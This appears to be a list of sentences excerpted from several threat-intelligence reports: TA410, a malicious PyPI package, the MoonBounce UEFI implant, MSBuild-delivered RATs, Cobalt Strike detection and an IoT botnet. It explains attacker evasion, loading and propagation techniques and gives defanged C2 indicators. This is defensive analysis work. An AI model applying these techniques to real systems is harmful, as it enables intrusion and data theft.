            "However, we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.",
            "In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value. ",
            "Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window.",
            "This information can help attackers understand stolen data by contextualizing it. ",
            "FlowCloud can also gather information about things happening around the victim\u2019s computer by taking pictures using connected camera peripherals and recording audio using a computer\u2019s microphone.",
            "This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume. ",
            "Attribution ESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but different toolsets and exiting from IP addresses located in three different districts.",
            "These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology and network infrastructure. ",
            "FlowingFrog uses Royal Road RTF documents, a first-stage implant called Tendyron, and a very complex second-stage backdoor called FlowCloud. ",
            "LookingFrog uses a first-stage backdoor called X4, and LookBack as a second stage. ",
            "JollyFrog uses only generic malware families such as Korplug (aka PlugX) and QuasarRAT.",
            "Part of the activity of this team was described by Fortinet, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the operations that APT10 (aka A41APT) has conducted recently. ",
            "FlowingFrog and JollyFrog share network infrastructure \u2013 more precisely, the domain ffca.caibi379[.]com, as mentioned by Proofpoint. ",
            "FlowingFrog and LookingFrog ran a phishing campaign at the same time against the same targets, as also mentioned in the same Proofpoint article. ",
            "In ESET telemetry, we do not see any other overlap between these subgroups.",
            "We believe that these subgroups operate somewhat independently but that they may share intelligence requirements, an access team that runs their spearphishing campaigns, and also the team that deploys network infrastructure. ",
            "Victimology Most TA410 targets are high-profile organizations in the diplomacy and education sectors, but we have also seen victims in the military sector, a manufacturing company in Japan, a mining company in India, and a charity in Israel.",
            "According to ESET telemetry, the victims are located in Africa, Asia, the Middle East, and Europe.",
            "Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the different teams. ",
            "An element worth mentioning is that TA410 targets foreign individuals in China.",
            "In ESET telemetry, we have observed this as having happened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian country in China. ",
            "Since 2018, we have seen the following targets, also depicted in Figure 1: FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company LookingFrog: Diplomatic missions, charity, government and industrial manufacturing JollyFrog: Education, church, military, diplomatic mission Figure 1.",
            "Map of countries and verticals targeted by TA410 Initial compromise and typical TTPs If we exclude the different backdoors, the three teams use a similar modus operandi.",
            "They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint.",
            "This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target. ",
            "The public-facing application compromise approach is what we have seen the most.",
            "Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.",
            "They then dropped an ASPX webshell that was used to install other malicious components.",
            "These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin. ",
            "In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications. ",
            "In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan.",
            "This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat Report T3 2021. ",
            "This shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists. ",
            "In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (HTran, LCX, EarthWorm), and lateral movement scripts such as WMIExec. Arsenal TA410 \u2013 FlowingFrog FlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules\u2019 PDB paths.

            "It may be the first supply chain attack to take advantage of the fact that Python byte code (PYC) files can be directly executed, and it comes amid a spike in malicious submissions to the Python Package Index (PyPI).",
            "If so, it poses yet another supply chain risk going forward, since this type of attack is likely to be missed by most security tools, which only scan Python source code (PY) files. ",
            "We reported the discovered package, named fshec2, to the PyPI security team on April 17, 2023, and it was removed from the PyPI repository the same day.",
            "The PyPI security team has also recognized this type of attack as interesting and acknowledged that it had not been previously seen. ",
            "Here\u2019s how my threat research team identified the fshec2 as a suspicious package and the novel method that the attackers employed as they attempted to avoid detection.",

            "Unusual behaviors ReversingLabs regularly scans open-source registers such as PyPi, npm, RubyGems, and GitHub looking for suspicious files.",
            "As the team observed before, these often jump out at us from the millions of legitimate, nonmalicious files hosted on these platforms because they exhibit strange qualities or behaviors that, experience tells us, often signal malicious intent. ",
            "That was the case with fshec2.",
            "The package initially caught our attention following a scan using the ReversingLabs Software Supply Chain Security platform, which extracted a suspicious combination of behaviors from an fshec2 compiled binary.",
            "Those suspicious behaviors extracted from the decompiled file included the presence of URLs that reference the host by IP address, as well as the creation of a process and execution of a file. ",
            "A manual review of the fshec2 package followed.",
            "It revealed that it contains only three files.",
            "The code inside two of those Python source code files, _init_.py and main.py, appeared benign.",
            "It was only upon inspection of a decompiled version of the third file, full.pyc, that more interesting behaviors came to light and the true nature of the package emerged. ",
            "Figure 1: Files containing package functionality Unmasking an unusual loader Threat actors are always trying to evade detection from security solutions.",
            "Obfuscation is one of the most popular methods to achieve this.",
            "For example, several of our previous research blogs have explored incidents in the npm landscape in which JavaScript obfuscation was used.",
            "That includes the Material Tailwind and IconBurst campaigns, as well as the more recent campaign we identified distributing Havoc malware. ",
            "Historically, npm has been the unfortunate leader and PyPI an also-ran in the race to see which open-source platform attracts the most attention from malware authors.",
            "In the last six months, however, ReversingLabs and others have observed a marked increase in the volume of malware published to PyPI.",
            "In fact, in May, the creation of new user accounts and projects on PyPI were temporarily suspended for a few hours due to a high volume of malicious activity. ",
            "Along with the increase in malicious modules, my team has observed an increase in the use of various obfuscation techniques in malware published to the PyPI repository.",
            "One of the most popular obfuscation techniques is execution of Base64-encoded malicious code, which was first observed in campaigns related to W4SP authors in November 2022.",
            "Variations of that attack, in which malicious code is embedded in code but shifted past the edge of default screen borders (thereby hiding it from view), are still seen in the wild.",
            "Today, however, attackers have more tools at their disposal.",
            "For example, use of W4SP crew obfuscation tools such as Hyperion and Kramer is on the rise \u2014 likely a response to the improving detection capabilities of security companies monitoring PyPI and other public package repositories. ",
            "The fshec2 package uses a significantly different approach that doesn\u2019t rely on obfuscation tools.",
            "It instead places the malicious functionality into a single file containing compiled Python byte code. ",
            "How Python attacks (usually) work Before I get to the new obfuscation method my team discovered, here\u2019s a look at how malicious attacks using Python typically work. ",
            "There are three types of Python files that may play a role in a malicious campaign: plaintext Python files, which have a /oy extension; compiled Python files, which have a .pyc extension; and Python files that have been compiled into native executables using tools such as py2exe and PyInstaller. ",
            "In most of the malicious campaigns that my team has observed leveraging PyPI packages, the executables are not present in the malicious package but are downloaded and run by the plaintext PY files from external infrastructure. ",
            "But fshec2 is different.",
            "Here, we observed a compiled Python file (full.pyc) present inside the PyPI package that contained malicious functionality.",
            "The entry point of the package was found in the __init__.py file, which imports a function from the other plaintext file, main.py, which contains Python source code responsible for loading of the Python compiled module located in one of the other files, full.pyc. ",
            "This innocent-seeming import of a function triggers a previously unseen loading technique inside the main.py file that avoids using the usual import directive, which is the simplest way to load a Python compiled module (and also something that is likely to get noticed.)",
            "Instead, Importlib, the implementation of import in Python source code portable to any Python interpreter, is used to avoid detection by security tools.",
            "(Some explanation: Importlib is typically used in cases where the imported library is dynamically modified upon import.",
            "However, the library loaded by main.py was unchanged, meaning that the regular import function would have sufficed.",
            "This tends to support the theory that Importlib is used to avoid detection.) ",
            "Figure 2: Loading of the compiled Python module from main.py After the module is loaded, its get_path method is invoked",
            "(see Figure 3).",
            "Using ReversingLabs Software Supply Chain Security, my team was able to detect and extract this code from the decompiled PYC file.",
            "The get_path method, which isn\u2019t found (in readable form) anywhere inside the original fshec2 package, performs some of the common malicious functions observed in other malicious PyPI packages we have analyzed.",
            "Among other things, it collects usernames, hostnames, and directory listings.",
            "It also fetches commands that are set for execution using scheduled tasks or cronjob, depending on the host platform. ",
            "Figure 3: The decompiled code extracted from the full.pyc compiled byte code file showing the content of the get_path() method. ",
            "The fetched commands are just another Python script, which is intended to change (see Figure 4).",
            "In fact, while I have been writing this blog, my team observed it download and execute yet another Python script from the cron_script located on the same host.",
            "The cron_script contained functionality almost identical to the script found in full.pyc, the compiled Python module shipped with the PyPI package. ",
            "In this way, the fshec2 attack is engineered to be able to evolve.",
            "The full.pyc file contains functionality to download commands from a remote server identified in the commands path on the C2 server.",
            "The downloaded commands are a Python file almost identical to full.pyc but with the location for downloading stage 2 commands placed in a cron_script, which periodically downloads new commands.",
            "This allows the attackers to change the content served at the commands location to make the malware serve new commands. ",
            "Figure 4: Code responsible for downloading cron_script file A misconfigured web host gives up the goods Given the malware\u2019s reliance on remote C2 infrastructure, it made sense to scout out the web host used in the attack to get more information about the malware\u2019s capabilities.",
            "As it turned out, the web host had plenty to tell us! ",
            "Like regular developers, malware authors often make configuration mistakes when setting up infrastructure.",
            "Such mistakes can reveal interesting information about the inner workings of malicious software.",
            "That was the case with the web host that was set up to communicate with compromised systems.",
            "For example, trying to access an invalid page on the web host did not generate a 404 \u201cpage not found\u201d error, as you would expect.",
            "Instead, visitors were served a page from a Django application listing a variety of commands (see Figure 5). ",
            "Figure 5: Uncovered web locations Fortunately for us, the Django application was configured in debug mode, with error descriptions that gave us a detailed list of reachable host paths.",
            "Some of those we had already seen in the downloaded scripts used in the attack, but there were new paths that we had not seen, including: admin, uploaded_files, and download. ",
            "Unfortunately, the trail went cold there, because all three of them require authorization to execute page functionality. ",
            "Figure 6: Password-protected file download form Still, some information was exposed by this oversight, even without knowing the password.",
            "For example, command No. 7 in Figure 5 provides a way to download files by their ID using the command: download/<int:file_id>, where file_id is an integer and the files in question are numbered in sequential order, starting from 1.",
            "As seen in Figure 6, the filename is also leaked without requiring authorization. ",
            "The sheer number of these mistakes might lead us to the conclusion that this attack was not the work of a state-sponsored actor and not an advanced persistent threat (APT). ",
            "While my team didn\u2019t collect enough evidence to prove that assumption one way or another, harvesting the filenames by incrementing file ID let us determine that the attack was successful in some cases.",
            "Our researchers still can\u2019t say who or what the targets were.",
            "However, we can confirm that developers did install the malicious PyPI package and that their machine names, usernames, and directory listings were harvested as a result. ",
            "Using the method described above, our researchers downloaded files with ID Nos. 1-18.",
            "The resulting filenames show that at least two targets were infected with username and hostname combinations desktop__desktop-7G-Series and Txxxx_Axxxx__LAPTOP-UH9S5HF2 (identifying information removed). ",
            "Some of the filenames suggest that additional malware commands include keylogging functionality. ",

            "title: MoonBounce: the dark side of UEFI firmware url: https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/ What happened? ",
            "At the end of 2021, we were made aware of a UEFI firmware-level compromise through logs from our Firmware Scanner, which has been integrated into Kaspersky products since the beginning of 2019.",
            "Further analysis has shown that a single component within the inspected firmware\u2019s image was modified by attackers in a way that allowed them to intercept the original execution flow of the machine\u2019s boot sequence and introduce a sophisticated infection chain. ",
            "By examining the components of the rogue firmware and other malicious artefacts from the target\u2019s network, we were able to reach the following conclusions: ",
            "The inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce; Due to its emplacement on SPI flash which is located on the motherboard instead of the hard disk, the implant is capable of persisting in the system across disk formatting or replacement; The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet; The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint; We detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the the stager\u2019s payload; By assessing the combination of the above findings with network infrastructure fingerprints and other TTPs exhibited by the the attackers; to the best of our knowledge the intrusion set in question can be attributed to APT41, a threat actor that\u2019s been widely reported to be Chinese-speaking; In this report we describe in detail how the MoonBounce implant works, how it is connected to APT41, and what other traces of activity related to Chinese-speaking actors we were able to observe in the compromised network that could indicate a connection to this threat actor and the underlying campaign. ",
            "Revisiting the current state of the art in persistent attacks In the last year, there have been several public accounts on the ongoing trend of UEFI threats.",
            "Notable examples include the UEFI bootkit used as part of the FinSpy surveillance toolset that we reported on, the work of our colleagues from ESET on the ESPectre bootkit, and a little-known threat activity that was discovered within government organisations in the Middle East, using a UEFI bootkit of its own (briefly mentioned in our APT trends report Q3 2021 and covered in more detail in a private APT report delivered to customers of our Threat Intelligence Portal). ",
            "The common denominator of those three cases is the fact that the UEFI components targeted for infection reside on the ESP (EFI System Partition), a storage space designated for some UEFI components, typically based in the computer\u2019s hard drive or SSD.",
            "The most notable elements of the ESP are the Boot Manager and OS loader, both invoked during the machine\u2019s boot sequence and which also happen to be the subject of tampering in the case of the aforementioned bootkits. ",
            "While all of the above were seen in use by advanced actors, a different class of bootkits raises even higher concern.",
            "This one is made up of implants found in the UEFI firmware within the SPI flash, a non-volatile storage external to the hard drive.",
            "Such bootkits are not only stealthier (partially because of limited visibility by security products into this hardware component), but also more difficult to mitigate: flashing a clean firmware image in place of a malicious one can prove to be more difficult than formatting a hard drive and reinstalling an OS, which would typically eliminate ESP level threats. ",
            "MoonBounce is notable for being the third publicly revealed case of an implant from the latter class of firmware-based rootkits.",
            "Previous cases included LoJax and MosaicRegressor, which we reported on during October 2020.",
            "In that sense, MoonBounce marks a particular evolution in this group of threats by presenting a more complicated attack flow in comparison to its predecessors and a higher level of technical competence by its authors, who demonstrate a thorough understanding of the finer details involved in the UEFI boot process. ",
            "Our discovery: a sophisticated implant within UEFI firmware The UEFI implant, which was detected in spring 2021 , was found to have been incorporated by the attackers into the CORE_DXE component of the firmware (also known as the DXE Foundation), which is called early on at the DXE (Driver Execution Environment) phase of the UEFI boot sequence.",
            "Among other things, this component is responsible for initializing essential data structures and function interfaces, one of which is the EFI Boot Services Table \u2013 a set of pointers to routines that are part of the CORE_DXE image itself and are callable by other DXE drivers in the boot chain. ",
            "The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.",
            "Those hooks are used to divert the flow of these functions to malicious shellcode that is appended by the attackers to the CORE_DXE image, which in turn sets up additional hooks in subsequent components of the boot chain, namely the Windows loader. ",
            "This multistage chain of hooks facilitates the propagation of malicious code from the CORE_DXE image to other boot components during system startup, allowing the introduction of a malicious driver to the memory address space of the Windows kernel.",
            "This driver, which runs during the initial phases of the kernel\u2019s execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.",
            "Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e. hxxp://mb.glbaitech[.]com/mboard.dll) and attempts to fetch another stage of the payload to run in memory, which we were not able to retrieve. ",
            "The diagram below contains the outline of the stages taken from the moment the hooked Boot Services are called in the context of the DXE Foundation\u2019s execution until the user-mode malware is deployed and run during the Operating System\u2019s execution.",
            "The full description of each step in the diagram, along with the analysis of both the MoonBounce driver and user-mode malware can be found in the technical document released alongside this report. ",
            "Flow of MoonBounce execution from boot sequence to malware deployment in user space Note that at the time of writing we lack sufficient evidence to retrace how the UEFI firmware was infected in the first place.",
            "The infection itself, however, is assumed to have occurred remotely.",
            "While previous UEFI firmware compromises (i.e. LoJax and MosaicRegressor) manifested as additions of DXE drivers to the overall firmware image on the SPI flash, the current case exhibits a much more subtle and stealthy technique where an existing firmware component is modified to alter its behaviour.",
            "Notably, particular functions were modified with an inline hook, meaning the replacement of the function prologue with an instruction to divert execution to a function chosen by the attacker.",
            "This form of binary instrumentation typically requires the attacker to obtain the original image, then parse and change it to introduce malicious logic.",
            "This would be possible for an attacker having ongoing and remote access to the targeted machine. ",
            "Other pieces of malware on the radar In addition to MoonBounce, we found infections across multiple nodes in the same network by a known user-mode malware dubbed ScrambleCross, also known as SideWalk.",
            "This is an in-memory implant, implemented as position-independent code, that can communicate to a C2 server in order to exchange information and stage the execution of additional plugins in memory, of which none has been sighted in the wild yet.",
            "This malware was thoroughly covered by our colleagues at Trend Micro and ESET, so we will refer the reader to their excellent write-ups to understand its internals better. ",
            "The position-independent code constituting ScrambleCross can be loaded in one of two ways, the first being a C++ DLL named StealthVector.",
            "It obtains the ScrambleCross shellcode by applying a modified ChaCha20 algorithm on an encrypted blob, which may reside as an additional file on disk or be embedded in the loader itself.",
            "We detected both variants of this loader in the network in question. ",

            "title: Threat Actors Use MSBuild to Deliver RATs Filelessly url: https://www.anomali.com/blog/threat-actors-use-msbuild-to-deliver-rats-filelessly Authored by: Tara Gould and Gage Mele Key Findings Anomali Threat Research identified a campaign in which threat actors used Microsoft Build Engine (MSBuild) to filelessly deliver Remcos remote access tool (RAT) and password-stealing malware commonly known as RedLine Stealer This campaign, which has low or zero detections on antivirus tools, appears to have begun in April 2021 and was still ongoing as of May 11, 2021. ",
            "We were unable to determine how the .proj files were distributed, and are unable to make a confident assessment on attribution because both RemcosRAT and RedLine Stealer are commodity malware. ",
            "Overview Anomali Threat Research discovered a campaign in which threat actors used MSBuild - a tool used for building apps and gives users an XML schema \u201cthat controls how the build platform processes and builds software\u201d - to filelessly deliver RemcosRAT, and RedLine stealer using callbacks.[1]",
            "The malicious MSBuild files we observed in this campaign contained encoded executables and shellcode, with some, hosted on Russian image-hosting site, \u201cjoxi[.]net.\u201d",
            "While we were unable to determine the distribution method of the .proj files, the objective of these files was to execute either Remcos or RedLine Stealer.",
            "The majority of the samples we analyzed deliver Remcos as the final payload. ",
            "Figure 1 - Infection chain Technical Analysis MSBuild MSBuild is a development tool used for building applications, especially where Visual Studio is not installed.[2] MSBuild uses XML project files that contain the specifications to compile the project and, within the configuration file, the \u201cUsingTask\u201d element defines the task that will be compiled by MSBuild.",
            "In addition, MSBuild has an inline task feature that enables code to be specified and compiled by MSBuild and executed in memory.",
            "This ability for code to be executed in memory is what enables threat actors to use MSBuild in fileless attacks. ",
            "A fileless attack is a technique used by threat actors to compromise a machine while limiting the chances of being detected.[3]",
            "Fileless malware typically uses a legitimate application to load the malware into memory, therefore leaving no traces of infection on the machine and making it difficult to detect.",
            "An analysis by network security vendor WatchGuard released in 2021 showed a 888% increase in fileless attacks from 2019 to 2020, illustrating the massive growth in the use of this attack technique, which is likely related to threat actor confidence that such attacks will be successful.[4] MSBuild Project File (.proj) Analysis Analyzed File \u2013 imaadp32.proj MD5 \u2013 45c94900f312b2002c9c445bd8a59ae6 The file we analyzed is called \u201cimaadp32.proj,\u201d and as shown in Figure 2 below, is an MSBuild project file (.proj).",
            "For persistence, mshta is used to execute a vbscript that runs the project file, with a shortcut file (.lnk) added to the startup folder (Figure 3). ",

            "File Created in Startup Folder Following the creation of persistence, two large arrays of decimal bytes were decoded by the function shown in Figure 4. Figure 4 - Decoding Function Porting the decoding function to Python, we created a script (Figure 5 below).",
            "By using the variable \u201cdec_list\u201d to contain the decimal to be converted, and the variable \u201ckey\u201d representing the string found at the end of decimal, we decoded the function. ",

            "title: How to Detect Cobalt Strike url: https://www.intezer.com/blog/malware-analysis/cobalt-strike-detect-this-persistent-threat/ Cobalt Strike is a penetration testing tool created by Raphael Mudge in 2012.",
            "To this day, it remains extremely popular in red team activities and used for malicious purposes by threat actors.",
            "Cobalt Strike is popular due to its range of deployment options, ease of use, ability to avoid detection by security products, and the number of capabilities it has.",
            "It is for these reasons that threat actors also like Cobalt Strike.",
            "Since Cobalt Strike is widely used by a range of actors, its lack of exclusivity makes attribution harder. ",
            "Companies still struggle to detect Cobalt Strike also due to the various defensive techniques it has.",
            "This blog explains Cobalt Strike and practical steps to take if you believe that you are being targeted by Cobalt Strike or already compromised.",
            "We will demonstrate some real world examples of Cobalt Strike delivery and steps to detect each. ",
            "What is Cobalt Strike? Cobalt Strike is marketed as \u201cSoftware for Adversary Simulations and Red Team Operations.\u201d",
            "It is a popular platform that allows users to emulate advanced threats, perform reconnaissance, hide communications, escalate privileges, move laterally across the network, and deploy additional payloads.",
            "The main payload of Cobalt Strike is called \u201cBeacon.\u201d",
            "The Beacon payload is used to model advanced APT malware, and can do the following: Receive commands (either passively or from an interactive console) Egress communications over HTTP, HTTPS, and DNS Launch PowerShell Execute binaries Modify and query the Windows registry Inject malicious code into legitimate processes Log keystrokes Take screenshots Set up proxies Escalate privileges Bypass UAC Dump password hashes Scan ports among other abilities This tool is mainly used in red team operations for government agencies and private enterprises, but it\u2019s also a popular tool leveraged by cybercrime and APT groups in cracked versions.",
            "It is evident why Cobalt Strike is used by organizations and threat actors alike because of the extensive suite of capabilities it possesses, and also due to its ability to bypass defenses.",
            "It also comes with the feature to generate reporting in which the attacking team or threat actor can continuously study and improve their campaigns. ",
            "Why is it difficult to detect Cobalt Strike? Cobalt Strike is difficult to detect because of its several defense techniques.",
            "Cobalt Strike payloads are usually shellcode encrypted with a rolling XOR key.",
            "This makes static analysis difficult to conduct.",
            "This, combined with the ability to configure many parts of the payload, makes hash-based detection almost impossible.",
            "Cobalt Strike stagers are designed to be loaded and executed only in-memory.",
            "This opens up a ton of possibilities for how this shellcode is shipped, making signature-based detection on the delivery method a cat and mouse game.",
            "Depending on how the code is delivered, the code can be injected into other legitimate running processes, bypassing defenses that do not scan legitimate processes or code in-memory. ",
            "How has Cobalt Strike been deployed? ",
            "Cobalt Strike has many different ways for deployment.",
            "This flexibility has helped attackers find many unconventional and creative ways to infect victims with a payload.",
            "For an in-depth technical analysis of Cobalt Strike\u2019s deployment options and how they differ, check out Avast\u2019s blog or this Cisco Talos white paper.",
            "Let\u2019s take a look at some real world examples of how Cobalt Strike is being used in the wild.",
            "We will cover the following: Macro-Laden Microsoft Office files Supply Chain Attack Living off the Land (LotL) Executables (EXE) files Macro-Laden Microsoft Office Files An example of a Cobalt Strike payload being delivered to victims via Microsoft Excel spreadsheets demonstrates that this tool is also used in mass phishing campaigns, not just targeted APT attacks.",
            "The attack starts by sending potential victims a Microsoft OneDrive link from which an Excel (.xls) file is downloaded.",
            "OneDrive URLs sent to victimsUsing cloud storage links to deliver malicious files is a well-known strategy.",
            "It leverages the good reputation of cloud provider domains such as Microsoft, Amazon, and Google to bypass domain reputation-based security controls.",
            "This link delivers an Excel file pretending to be an Apple Store invoice requesting the target \u201cenable content to view receipt.",
            "\u201dSpreadsheet lure masquerading as an Apple Store receiptUpon enablement of macros, the spreadsheet will fetch and execute the payload in-memory. ",
            "How to Detect? ",
            "This can be difficult to detect, as there are multiple degrees of separation before the Cobalt Strike payload is executed.",
            "Detection first requires dynamic analysis in order to reach the Cobalt Strike stage.",
            "When this stage is reached, the best ways to detect the running Cobalt Strike code are through static signatures or genetic code analysis.",
            "When it comes to static signatures, it can be difficult to isolate the exact area in-memory that you should run the signatures over.",
            "One way this can be achieved is running the file through debugging tools and manually dumping memory to perform signature analysis. ",
            "This can be extremely time consuming and requires a high degree of technical knowledge.",
            "Another possible way is to use a sandbox and download memory dumps from a finished analysis in order to run static analysis tools.",
            "This requires slightly less technical knowledge but it still can be time consuming.",
            "We suggest taking the suspicious document and uploading it to Intezer Analyze to find out if Cobalt Strike is hidden in-memory.",
            "Intezer Analyze result for Cobalt Strike payload Supply Chain Attack One of the biggest cybersecurity stories of 2020 was the SolarWinds supply chain attack that compromised high-profile entities around the world.",
            "This attack was done by an APT group known as NOBELIUM (UNC2452) leveraging the \u201cOrion\u201d business software to distribute malware to private and public organizations.",
            "Among the deployed malware was a Cobalt Strike loader dubbed TEARDROP by FireEye.",
            "The variant was named Raindrop by Symantec.",
            "The TEARDROP dropper is a memory-only DLL that runs as a service spawning a thread that pulls the Cobalt Strike payload from a fake JPG file.",
            "The Raindrop variant is built from a modified version of 7-ZIP source code.",
            "It uses a different custom packer than TEARDROP, also leveraging steganography to locate the start of the encoded payload.",
            "Once the encoded payload has been located, it extracts, decrypts, and decompresses the data to be executed as shellcode. ",
            "It can often be difficult to detect if your organization has been the victim of a supply chain attack.",
            "It can be especially hard to collect forensic evidence for an attack when it could be mixed in with the code of legitimate and large files.",
            "Due to the nature of supply chain attacks, there are often a large number of machines in an organization infected at one time.",
            "An action you can take is to run Intezer\u2019s live endpoint scanner across all machines in the organization.",

            "Unlike the earlier SSH brute-forcing campaign, the plaintext credentials are embedded into the malware instead of being downloaded from the C2. ",
            "These credentials used appear to be default credentials for IoT devices.",

            "Unlike less sophisticated IoT malware, this allows the malware to avoid trying to test a full list of credentials.",
            "While not exactly a novel technique, it is still uncommon compared to other IoT botnets. ",

            "It attempts to specifically gain root access to these devices via a default password, despite having the same credentials in the list embedded in the binary. ",
            "Like the earlier SSH brute-forcing campaign, once it has successfully gained access, it sends the credentials used, the compromised device\u2019s IP address, and its architecture to the C2 server on a separate port, 5123.",
            "After reporting, the malware attempts to install its main payload binary on the compromised device. ",

            "This allows it to download and deploy a RapperBot payload of the correct architecture to ensure proper execution.",
            "This selective behavior is more efficient than the shotgun approach in most IoT malware families, whereby all the binaries for the supported architectures are downloaded and executed in the victim's system. ",
            "Based on the payload binaries we collected, this botnet currently seems to only target devices running on ARM, MIPS, PowerPC, SH4, and SPARC architectures.",
            "Moreover, it specifically checks and stops its self-propagation if the device is detected to be running on Intel processors. ",
            "The bot then downloads its payload via software installed on the compromised device, such as ftpget, wget, curl, or tftp, before executing the payload. ",
            "If none of the software mentioned above is installed, it will extract and send an embedded binary downloader to the compromised device that executes and downloads the primary payload. ",
            "Unlike in Satori, these embedded downloaders are stored as escaped byte strings, probably to simplify parsing and processing within the code. ",
            "The binary downloaders are written by echoing the bytes and piping the content to a file in the victim system.",
            "As labeled in Figure 4, each binary has a hardcoded URL for downloading the payload binary of the proper architecture. ",
            "No attempts to persist on infected or brute-forced devices were observed for this campaign. ",
            "Related Campaigns FortiGuard Labs compared samples for this and related campaigns from the past to find any links with the previously reported RapperBot campaign. ",
            "We observed that the earliest samples for this campaign were from December 2021 and that the SA:MP attack was only added in February 2022.",
            "This campaign mysteriously disappeared in mid-April 2022, resurfacing in Oct 2022 with the addition of the self-propagation feature. ",
            "We also found older samples from another campaign that was active in August-September 2021 with an almost identical list of credentials.",
            "These samples contain slightly fewer credentials and a simpler self-propagation code that only supports downloading the payload via wget or the binary downloader embedded directly into the sample.",
            "This campaign did not support stopping or restarting the Telnet propagation, and while the samples support the same commands, their associated IDs did not match. ",
            "The similar lists of credentials suggest that the threat actor behind this current campaign has access to the source code for the earlier campaign, as this code was not found in other IoT malware samples. ",
            "Connections to RapperBot The fact that samples from both campaigns use the same C2 protocol, coupled with the absence of this campaign during the RapperBot campaign active between June and Aug 2022 and its recent reappearance, seems to be more than a coincidence. ",
            "With the several similarities between the two campaigns outlined below, we believe that either the same threat actor might be behind both campaigns or each campaign might have branched from the same privately-shared source code. ",
            "The C2 commands and corresponding IDs are identical in both campaigns (excluding the Telnet-related commands, as those do not apply to RapperBot) Both campaigns show a certain degree of effort in optimizing the brute forcing implementation.",
            "Code for the brute forcing implementation is significantly more structured than typical IoT malware that copies and pastes code with minimal modifications. ",

            "Evidence suggests that as early as October 2019, these attackers have been testing their ability to insert code by adding empty classes.",
            "Therefore, insertion of malicious code into the SolarWinds.Orion.Core.BusinessLayer.dll likely occurred at an early stage, before the final stages of the software build, which would include digitally signing the compiled code.",

            "In many of their actions, the attackers took steps to maintain a low profile.",
            "For example, the inserted malicious code is lightweight and only has the task of running a malware-added method in a parallel thread such that the DLL\u2019s normal operations are not altered or interrupted.",
